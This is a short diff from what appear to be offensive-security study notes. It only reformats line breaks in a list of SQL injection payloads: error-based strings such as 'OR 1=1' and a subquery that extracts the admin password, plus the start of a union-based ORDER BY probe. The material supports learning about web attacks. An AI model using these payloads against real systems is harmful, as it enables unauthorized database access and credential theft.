@@ -845,11 +845,11 @@
     SELECT * FROM users
     ```
 - 10.33.1 Manual Code execution
-  - error based
-    username: offsec'
-    `offsec' OR 1=1 --//`
-    `' or 1=1 in (select @@version) -- //`
-    `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
+  - error based  
+    username: offsec'  
+    `offsec' OR 1=1 --//`  
+    `' or 1=1 in (select @@version) -- //`  
+    `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`  
   - union-based
     ```
     ' ORDER BY 1 -- //
